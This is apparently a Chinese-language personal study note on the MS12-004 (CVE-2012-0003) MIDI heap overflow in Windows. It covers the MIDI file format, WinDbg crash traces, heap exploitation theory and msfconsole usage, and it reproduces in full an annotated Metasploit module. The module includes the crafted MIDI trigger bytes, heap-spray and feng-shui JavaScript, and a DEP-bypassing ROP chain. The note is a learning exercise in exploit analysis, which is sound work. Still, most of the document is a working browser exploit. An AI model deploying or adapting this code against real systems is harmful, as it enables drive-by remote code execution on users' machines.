# CVE-2012-0003

## MIDI文件格式

MIDI 为乐器音乐数字信号接口通信标准，用于音乐软件和硬件设备存储歌曲信息。

文件结构：

​		由若干块（Chunk）组成,  分为 包头块（Header Chunk）、音轨块（Track Chunk）

​		块：块标记（4字节）+ 块长度（4字节）+ 块数据

​		

| 块名称  | 块标记（4字节） | 块长度（4字节） | 块数据        |
| ------- | --------------- | --------------- | ------------- |
| 包头块  | “MThd”          | 00 00 00 06     | 6字节长度数据 |
| 音轨块1 | “MTrk”          | 数据长度        | 数据          |
| ...     | ...             | ...             | ..            |





包头块

| 偏移 | 长度 |                        | 数值                |
| ---- | ---- | ---------------------- | ------------------- |
| 0x00 | 4    | 块标记                 | “MThd”              |
| 0x04 | 4    | 块长度                 | 00 00 00 06         |
| 0x08 | 2    | 格式类型               | 0-2                 |
| 0x10 | 2    | 音轨数                 | 1-65535             |
| 0x12 | 2    | 时间计数值，每拍计数值 | 0x60 八分音符为一拍 |



音轨事件

| 事件类型                        | 格式               |
| ------------------------------- | ------------------ |
| 关闭音符 （note off）           | 0x8n note velocity |
| 打开音符 （Note on）            |    0x9n note velocity               |
| 触后音符 （Note Aftertouch）    | 0xAn note velocity |
| 控制器 （Controler）            | 0xBn type value |
| 音色切换 （program Chage)       | 0xCn num |
| 触后通道 （Channel Agtertouch） | 0xDn note amount |
| 滑音 （Pitch Bend）             | 0xEn LSB MSB |
| 元事件（meta events）           | 0xFF type length data |
| 结束标志                        | FF 2F 00 |



**理解midiOutPlayNextPolyEvent  问题1**

在Windows的消息函数中，有两个非常熟悉的参数：wParam，lParam。

  这两个参数的字面意义对于现在的程序来说已经不重要了，因为它是16位系统的产物，为了保持程序的可移植性，就将它保存了下来。

  它的字面意义，w表示word，l表示long，对于32为系统来说，分别是无符号整数（unsigned int）和长整型（long），都是32位整数。所以，根据具体的消息解析参数即可，不用在乎其字面意义了。

  下面是Windows的定义

`/* Types use for passing & returning polymorphic values */`

`typedef` `UINT_PTR`            `WPARAM``;`

`typedef` `LONG_PTR`            `LPARAM``;`

`//下面是32位程序的宏定义`

`typedef` `_W64 unsigned ``int` `UINT_PTR``, *``PUINT_PTR``;`

`typedef` `_W64 ``long` `LONG_PTR``, *``PLONG_PTR``;`



**漏洞利用：**

自测的 时候 漏洞利用 不成功。。。

尴尬了。。

思路是 分析 利用 了解下 溢出点吧



msf利用命令如下：

```
 msfconsole

    search cve-2012-0003 

    use exploit/windows/browser/ms12_004_midi 

    set uripath test.html

    set payload windows/exec

    set cmd calc.exe

    server started

    http://192.168.118.129:8080/test.html 
```

参照了 [链接](https://www.anquanke.com/post/id/85089) 进行不成功情况下的 调试学习

首先明确了一点 

先做堆页异常启动

```
gflags.exe  -i iexplore.exe +hpa    (exe 在C:\Program Files\Debugging Tools for Windows (x86) 目录下 ，自己刚开始还以为是环境变量里就有。。)

g 运行

打开 http://192.168.118.129:8080/test.html  挂马站点



eax=058e0f64 ebx=00000000 ecx=0c0c1bd0 edx=00000040 esi=0d6d4158 edi=020fc948
eip=77c4ca7a esp=020fc59c ebp=020fc5d8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\msv1_0.dll - 
msv1_0!LsaApInitializePackage+0xcbf:
77c4ca7a 6f              outs    dx,dword ptr [esi]   ds:0023:0d6d4158=0000091d

77c4ca7a 处有异常


```

回顾下 常见的堆利用 DWORD SHOOT 

> ​	堆管理 三类操作 堆块分配、堆块释放、堆块合并 （主要是 链表数据结构修改）
>
> ​	堆利用主要是对 利用构造数据 溢出下一个堆块块首 改写堆块前后向指针 ，在堆操作时获得，向内存任意地址写入任意数据的机会（DWORD SHOOT）
>
> ​	 利用场景
>
> | 点射目标（target）   | 子弹（payload）   | 改写后的结果                  |
> | -------------------- | ----------------- | ----------------------------- |
> | 栈帧中的函数返回地址 | shellcode起始地址 | 函数返回时，跳去执行shellcode |
> | 栈帧中的S.E.H句柄    | shellcode起始地址 | 异常返回时，跳去执行shellcode |
> | 重要函数的调用地址   | shellcode起始地址 | 函数调用时，跳去执行shellcode |
>
> node->blink->flink=node->flink
>
> node->flink->blink=node->blink
>
> 通过  劫持  前后向  堆块指针 来进行  DWORD SHOOT 

一般的思路（根据文章）弄清参数传递过程找到 DWORD SHOOT  来覆盖异常处理相关的函数地址来控制eip

在可控数据复制到内存后知道到堆分配调用



继续向下调试

​	



```shell
gflags -i iexplore.exe -hpa

bu WINMM!midiOutPlayNextPolyEvent   （但是其实 我的环境下第一次的崩溃点 地址 和对应的符号函数不同 我的为C:\WINDOWS\system32\msv1_0.dll - msv1_0!LsaApInitializePackage+0xcbf dll 也不符合 说明还是有问题的）

g 
```



这个地方的 异常崩溃点就 完全不同了，根据文章有点分析不下去了，确切的问题 是他没有调用 媒体的dll ,所以也没有到达异常的崩溃点



看了另外一篇[文章](https://www.cnblogs.com/Ox9A82/p/5715006.html)

谈了一个问题 关于对象虚表访问



> 虚表：每个有虚函数的类或者虚继承的子类，编译器都会为它生成一个虚表，表中的每一个元素都指向一个虚函数的地址（虚表是从属于类的） 
>
> 
>
> 虚函数：在某[基类](https://baike.baidu.com/item/%E5%9F%BA%E7%B1%BB/9589663)中声明为 virtual 并在一个或多个[派生类](https://baike.baidu.com/item/%E6%B4%BE%E7%94%9F%E7%B1%BB/9589520)中被重新定义的[成员函数](https://baike.baidu.com/item/%E6%88%90%E5%91%98%E5%87%BD%E6%95%B0/2440706)，用法格式为：virtual 函数返回类型 函数名（参数表） {[函数体](https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E4%BD%93)} 

> 
>
> **什么是函数指针？**
>
> 　　指针指向对象称为对象指针，指针除了指向对象还可以指向函数，函数的本质就是一段二进制代码，我们可以通过指针指向这段代码的开头，计算机就会从这个开头一直往下执行，直到函数结束，并且通过指令返回回来。函数的指针与普通的指针本质上是一样的，也是由四个基本的内存单元组成，存储着内存的地址，这个地址就是函数的首地址。
>
> 虚继承：
>
> ​	为了解决在这个例子中，即有多继承，又有多重继承，类D继承于类B和类C，而类B和类C都继承于类A，这就导致类D中会存在两份类A，这是不允许的，那么就得通过今天的虚继承来解决这个问题。[文章](https://www.cnblogs.com/tao-shao/p/7043863.html)
>
> 



这种情况下：

```
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=002261c4 ebx=00000000 ecx=0c0c0c0c edx=0000003d esi=00225dc8 edi=0039d910
eip=7e390581 esp=0012e198 ebp=0012e1a8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
mshtml!CAttrValue::GetIntoVariant+0x4d:
7e390581 ff5104          call    dword ptr [ecx+4]    ds:0023:0c0c0c10=????????
```

由于是ie的漏洞我们对这种call [ecx+4]的形式比较敏感（因为ie存在大量的对象虚表访问），来具体看一下，ub mshtml!CAttrValue::GetIntoVariant+0x4d，如下 



```
0:000> ub mshtml!CAttrValue::GetIntoVariant+0x4d
mshtml!CAttrValue::GetIntoVariant+0x3a:
7e39056e e8f93ef0ff      call    mshtml!VariantCopy (7e29446c)
7e390573 8bd8            mov     ebx,eax
7e390575 eb35            jmp     mshtml!CAttrValue::GetIntoVariant+0x78 (7e3905ac)
7e390577 8b460c          mov     eax,dword ptr [esi+0Ch]
7e39057a 3bc3            cmp     eax,ebx
7e39057c 7406            je      mshtml!CAttrValue::GetIntoVariant+0x50 (7e390584)
7e39057e 8b08            mov     ecx,dword ptr [eax]
7e390580 50              push    eax
```

我们一看就知道这个就是虚表访问，这个套路在ie里真是见过太多了，eax是对象指针，ecx是虚表指针，那么call [ecx+4]就是调用虚函数了。 

以上是虚表访问的分析和知识





然后这个 书上  讲了  基于导图推算的漏洞分析方法（其实就是 IDA 静态代码分析 +动态分析） 他通过反编译代码找到溢出点，但是我没太理解  推导方法（功力不够），但是大概明白了对于，基于这种方法的思维，可能需要实战来锻炼。后面跟进了下推导过程，基本明确了，通过奔溃点向上推导函数位置，以及堆块分配大小的由来

后面分析 msf ruby代码好了，大概分析一下，然后。先过，环境问题

针对其 ruby 代码进行了解分析

```ruby
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML #导入httpserver库 来进行服务生成

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS12-004 midiOutPlayNextPolyEvent Heap Overflow",
			'Description'    => %q{
					This module exploits a heap overflow vulnerability in the Windows Multimedia
				Library (winmm.dll). The vulnerability occurs when parsing specially crafted
				MIDI files.  Remote code execution can be achieved by using Windows Media Player's
				ActiveX control.

					Exploitation is done by supplying a specially crafted MIDI file with
				specific events, causing the offset calculation being higher than how much is
				available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing
				us to either "inc al" or "dec al" a byte.  This can be used to corrupt an array
				(CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects,
				which leverages remote code execution under the context of the user.

					At this time, for IE 8 target, JRE (Java Runtime Environment) is required
				to bypass DEP (Data Execution Prevention).

					Note: Based on our testing, the vulnerability does not seem to trigger when
				the victim machine is operated via rdesktop.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Shane Garrett',  #Initial discovery (IBM X-Force)
					'juan vazquez',
					'sinn3r',
				],
			'References'     =>
				[
					[ 'MSB', 'MS12-004'],
					[ 'CVE', '2012-0003' ],
					[ 'OSVDB', '78210'],
					[ 'BID', '51292'],
					[ 'URL', 'http://www.vupen.com/blog/20120117.Advanced_Exploitation_of_Windows_MS12-004_CVE-2012-0003.php' ],
				],
			'Payload'        =>
				{
					'Space'    => 1024,
				},
			'DefaultOptions'  =>
				{
					'EXITFUNC'             => "process",
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[
						'IE 6 on Windows XP SP3',     #环境适应版本，应该按照这个来调试
						{
							'Rop' => false,
							'DispatchDst' => 0x0c0c0c0c
						}
					],
					[
						'IE 7 on Windows XP SP3',
						{
							'Rop' => false,
							'DispatchDst' => 0x0c0c0c0c
						}
					],
					[
						'IE 8 on Windows XP SP3',
						{
							# xchg ecx,esp
							# or byte ptr [eax],al
							# add byte ptr [edi+5Eh],bl
							# ret 8
							# From IMAGEHLP
							'Rop' => true,
							'StackPivot' => 0x76C9B4C2,
							'DispatchDst' => 0x0c0c1be4
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jan 10 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(request)  #根据UA头，进行目标浏览器识别
		agent = request.headers['User-Agent']
		vprint_status("Request from: #{agent}")

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
			#Windows XP SP3 + IE 6.0
			return targets[1]
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
			#Windows XP SP3 + IE 7.0
			return targets[2]
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8\.0/
			#Windows XP SP3 + IE 8.0 + JRE6
			return targets[3]
		else
			return nil
		end
	end

	def get_midi
		# MIDI Fileformat Reference:
		# http://www.sonicspot.com/guide/midifiles.html
		#
		# Event Types:
		# 0x08 = Note Off (when MIDI key is released)
		# 0x09 = Note On (when MIDI key is pressed)
		# 0x0A = Note aftertouch (pressure change on the pressed MIDI key)
		# 0x0B = Controller Event (MIDI channels state)
		# 0x0C = Program change (Which instrument/patch should be played on the MIDI channel)
		# 0x0D = Channel aftertouch (similar to Note Aftertouch; effects all keys pressed on the specific MIDI channel)
		# 0x0E = Pitch Bend (similiar to a controller event; has 2 bytes to describe its value)
		# 0x0F = Meta Events (not sent or received over a midi port)

		# Structure:
		# [Header Chunk][Track Chunk][Meta Event][Meta Event][SYSEX Event][Midi Channel Event)
		# Problem:
		# Windows Media Player fails to manage Note On and Note Off Events

		# Track Chunk Data
		tc = "\x00\xFF\x03\x0D\x44\x72\x75\x6D" #没懂
		# Meta Event - Sequence/Track Name
		tc << "\x73\x20\x20\x20\x28\x42\x42\x29\x00"  #曲名块
		# Midi Channel Event - Program Change
		tc << "\x00\xC9\x28"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x07\x64"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x0A\x40"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x7B\x00"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x5B\x28"
		# Midi Channel Event - Controller
		tc << "\x00\xB9\x5D\x00"
		# Midi Channel Event - Note On
		tc << "\x85\x50\x99\x23\x7F"

		# Corruption events
		# Midi Channel Event - Note On
		tc << "\x00\x9F\xb2\x73"
		# Ends Corruption events

		# Meta Event - End Of Track
		tc << "\x00\xFF\x2F\x00"
		m = ''
		# HEADERCHUNK Header  头块
		m << "MThd"                 # Header
		m << "\x00\x00\x00\x06"     # Chunk size
		m << "\x00\x00"             # Format Type
		m << "\x00\x01"             # Number of tracks
		m << "\x00\x60"             # Time division
		# TRACKCHUNK header    音轨块 
		m << "MTrk"                 # Header
		m << [tc.length].pack('N')
		m << tc

		midi_name = "test_case.mid"

		return midi_name, m
	end

	def on_request_uri(cli, request)  #构造请求

		if request.uri =~ /\.mid$/i
			print_status("Sending midi file to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, @midi, {'Content-Type'=>'application/octet-strem'})
			return
		end

		#Set default target
		my_target = target

		#If user chooses automatic target, we choose one based on user agent
		if my_target.name =~ /Automatic/
			my_target = get_target(request)
			if my_target.nil?
				send_not_found(cli)
				print_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")
				return
			end
			vprint_status("Target selected: #{my_target.name}")
		end

		midi_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
		midi_uri << "/#{@m_name}"

		spray = build_spray(my_target)

		if datastore['OBFUSCATE']
			spray = ::Rex::Exploitation::JSObfu.new(spray)
			spray.obfuscate
		end

		trigger = build_trigger(my_target)
		trigger_fn = "trigger"

		if datastore['OBFUSCATE']
			trigger = ::Rex::Exploitation::JSObfu.new(trigger)
			trigger.obfuscate
			trigger_fn = find_trigger_fn(trigger.to_s)
		end

		html = %Q|
		<html>
		<head>
		<script language='javascript'>
			#{spray}
		</script>
		<script language='javascript'>
			#{trigger}
		</script>
		<script for=audio event=PlayStateChange(oldState,newState)>
			if (oldState == 3 && newState == 0) {
				#{trigger_fn}();
			}
		</script>
		</head>
		<body>
			<object ID="audio" WIDTH=1 HEIGHT=1 CLASSID="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95">
				<param name="fileName" value="#{midi_uri}">
				<param name="SendPlayStateChangeEvents" value="true">
				<param NAME="AutoStart" value="True">
				<param name="uiMode" value="mini">
				<param name="Volume" value="-300">
			</object>
		</body>
		</html>
		|

		html = html.gsub(/^\t\t/, '')

		print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

	def exploit
		@m_name, @midi = get_midi   #这个就 直接构造好了 数据  ，书中所写的下面
		super
	end

	def build_spray(my_target)

		# Extract string based on target
		if my_target.name == 'IE 8 on Windows XP SP3'
			js_extract_str = "var block = shellcode.substring(2, (0x40000-0x21)/2);"
		else
			js_extract_str = "var block = shellcode.substring(0, (0x80000-6)/2);"
		end

		# Build shellcode based on Rop requirement
		if my_target['Rop']
			code = create_rop_chain(my_target)
			code << payload.encoded
			shellcode = Rex::Text.to_unescape(code)
		else
			code = payload.encoded
			shellcode = Rex::Text.to_unescape(code)
		end

		# 1. Create  big block of nops
		# 2. Compose one block which is nops + shellcode
		# 3. Repeat the block
		# 4. Extract string from the big block
		# 5. Spray
		spray = <<-JS
		var heap_obj = new heapLib.ie(0x10000);

		var code = unescape("#{shellcode}");
		var nops = unescape("%u0c0c%u0c0c");

		while (nops.length < 0x1000) nops+= nops;

		var shellcode =  nops.substring(0,0x800 - code.length) + code;

		while (shellcode.length < 0x40000) shellcode += shellcode;

		#{js_extract_str}

		heap_obj.gc();
		for (var i=0; i < 600; i++) {
			heap_obj.alloc(block);
		}

		JS

		spray = heaplib(spray, {:noobfu => true})
		return spray
	end

	# Build the JavaScript string for the attributes
	def build_element(element_name, my_target)
		dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack("V"))
		element = ''

		if my_target.name =~ /IE 8/
			max   = 63   # Number of attributes for IE 8
			index = 1    # Where we want to confuse the type
		else
			max   = 55   # Number of attributes for before IE 8
			index = 0    # Where we want to confuse the type
		end

		element << "var #{element_name} = document.createElement(\"select\")" + "\n"

		# Build attributes
		0.upto(max) do |i|
			obj = (i==index) ? "unescape(\"#{dst}\")" : "alert"
			element << "#{element_name}.w#{i.to_s} = #{obj}" + "\n"
		end

		return element
	end

	# Feng Shui and triggering Steps:
	# 1. Run the garbage collector before allocations
	# 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)
	# 3. Make holes
	# 4. Let windows media play the crafted midi file and corrupt the heap
	# 5. Force the using of the confused tagVARIANT.
	def build_trigger(my_target)

		if my_target.name == 'IE 8 on Windows XP SP3'

			# Redoing the feng shui if fails makes it reliable
			js_trigger = <<-JSTRIGGER
			function trigger(){
				var k = 999;
				while (k > 0) {
					if (typeof(clones[k].w1) == "string") {
					} else {
						clones[k].w1('come on!');
					}
					k = k - 2;
				}
				feng_shui();
				document.audio.Play();
			}
			JSTRIGGER

			select_element = build_element('selob', my_target)
		else

			js_trigger = <<-JSTRIGGER
			function trigger(){   #JS 层验证 通过 string obj类型转换  来破坏堆，进行堆溢出利用
				var k = 999;
				while (k > 0) {
					if (typeof(clones[k].w0) == "string") {
					} else {
						clones[k].w0('come on!');
					}
					k = k - 2;
				}
				feng_shui();
				document.audio.Play();
			}
			JSTRIGGER

			select_element = build_element('selob', my_target)
		end

		trigger = <<-JS
			var heap = new heapLib.ie();
			#{select_element}
			var clones=new Array(1000);

			function feng_shui() {

				heap.gc();

				var i = 0;
				while (i < 1000) {
					clones[i] = selob.cloneNode(true)
					i = i + 1;
				}

				var j = 0;
				while (j < 1000) {
					delete clones[j];
					CollectGarbage();
					j  = j + 2;
				}

			}

			feng_shui();

			#{js_trigger}
		JS

		trigger = heaplib(trigger, {:noobfu => true})
		return trigger
	end

	def find_trigger_fn(trigger)
		fns = trigger.scan(/function ([a-zA-Z0-9_]+)\(\)/)
		if fns.nil? or fns.empty?
			return "trigger"
		else
			return fns.last.first
		end
		return "trigger"
	end

	def junk(n=1)
		tmp = []
		value = rand_text(4).unpack("L")[0].to_i
		n.times { tmp << value }
		return tmp
	end

	# ROP chain copied from ms11_050_mshtml_cobjectelement.rb (generated by mona)
	# Added a little of roping to adjust the stack pivoting for this case
	# Specific for IE8 XP SP3 case at this time
	def create_rop_chain(my_target)

		rop_gadgets =
		[
			0x7c347f98,  # RETN (ROP NOP) [msvcr71.dll]
			my_target['StackPivot'],  # stackpivot
			junk, # padding
			0x7c376402,  # POP EBP # RETN [msvcr71.dll]
			0x7c376402,  # skip 4 bytes [msvcr71.dll]
			0x7c347f97,  # POP EAX # RETN [msvcr71.dll]
			0xfffff800,  # Value to negate, will become 0x00000201 (dwSize)
			0x7c351e05,  # NEG EAX # RETN [msvcr71.dll]
			0x7c354901,  # POP EBX # RETN [msvcr71.dll]
			0xffffffff,
			0x7c345255,  # INC EBX # FPATAN # RETN [msvcr71.dll]
			0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll]
			0x7c344f87,  # POP EDX # RETN [msvcr71.dll]
			0xffffffc0,  # Value to negate, will become 0x00000040
			0x7c351eb1,  # NEG EDX # RETN [msvcr71.dll]
			0x7c34d201,  # POP ECX # RETN [msvcr71.dll]
			0x7c38b001,  # &Writable location [msvcr71.dll]
			0x7c34b8d7,  # POP EDI # RETN [msvcr71.dll]
			0x7c347f98,  # RETN (ROP NOP) [msvcr71.dll]
			0x7c364802,  # POP ESI # RETN [msvcr71.dll]
			0x7c3415a2,  # JMP [EAX] [msvcr71.dll]
			0x7c347f97,  # POP EAX # RETN [msvcr71.dll]
			0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
			0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN [msvcr71.dll]
			0x7c345c30,  # ptr to 'push esp #  ret ' [msvcr71.dll]
		].flatten.pack('V*')

		return rop_gadgets
	end


end
```

